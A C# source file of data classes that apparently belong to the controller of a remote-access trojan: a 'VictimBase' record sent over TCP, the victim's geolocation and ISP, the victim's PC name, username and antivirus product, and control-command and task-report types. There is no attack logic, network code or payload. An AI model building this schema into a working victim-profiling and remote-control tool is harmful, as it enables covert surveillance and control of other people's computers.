using System;
using Newtonsoft.Json;

namespace Controller.ActionClass
{
    public class Dummy : ISend
    {
        public long FutID { get; set; }
        public long TskID { get; set; }

        public string DummyStr { get; set; }
    }


    public interface ISend
    {
        long FutID { get; set; }
        long TskID { get; set; }
    }

    public class PingMGR { public DateTime PingSTime { get; set; } }

    public class ControlCMD : ISend
    {
        public long FutID { get; set; }
        public long TskID { get; set; }
    }

    public class VictimBase // Root Victim Class Which Will Be Actually Sent Over The TCP Network
    {
        public VLocation Location { get; set; }
        public VPCDetails SysInfo { get; set; }

        public VictimBase(VLocation _Location, VPCDetails _SInf)
        {
            SysInfo = _SInf;
            Location = _Location;
        }
    }

    public class VLocation // Victim Location Informations
    {
        [JsonProperty("status")]
        public string Status { get; set; }

        [JsonProperty("continent")]
        public string Continent { get; set; }

        [JsonProperty("country")]
        public string Country { get; set; }

        [JsonProperty("countryCode")]
        public string CountryCode { get; set; }

        [JsonProperty("regionName")]
        public string RegionName { get; set; }

        [JsonProperty("city")]
        public string City { get; set; }

        [JsonProperty("zip")]
        public string Zip { get; set; }

        [JsonProperty("lat")]
        public double Latitude { get; set; }

        [JsonProperty("lon")]
        public double Longitude { get; set; }

        [JsonProperty("timezone")]
        public string Timezone { get; set; }

        [JsonProperty("currency")]
        public string Currency { get; set; }

        [JsonProperty("isp")]
        public string ISP { get; set; }

        [JsonProperty("mobile")]
        public bool IsMobile { get; set; }

        [JsonProperty("proxy")]
        public bool IsProxy { get; set; }

        [JsonProperty("hosting")]
        public bool IsHosting { get; set; }

        [JsonProperty("query")]
        public string IPQuery { get; set; }
    }

    public class VPCDetails // Victim's PC Major Details
    {
        public string RemainingSize { get; set; }
        public string TotalSize { get; set; }
        public string PCName { get; set; }
        public string UserName { get; set; }
        public string Antivirus { get; set; }
        public string OSName { get; set; }
        public bool IsOS64Bit { get; set; }
        public int DriveCount { get; set; }
        public int ProcessorCount { get; set; }
    }

    public class TaskReport
    {
        private bool IsEr = false;
        public long TaskID { get; set; }
        public string Status { get; set; }
        public Exception Error { get; set; }
        public bool HasFinished { get; set; }
        public long FutID { get; set; } = -1;
        public bool IsFutSucess { get; set; } = false;

        public bool IsFailed
        {
            get => IsEr;
            set
            {
                IsEr = value;
                if (IsEr) HasFinished = true;
            }
        }
    }
}
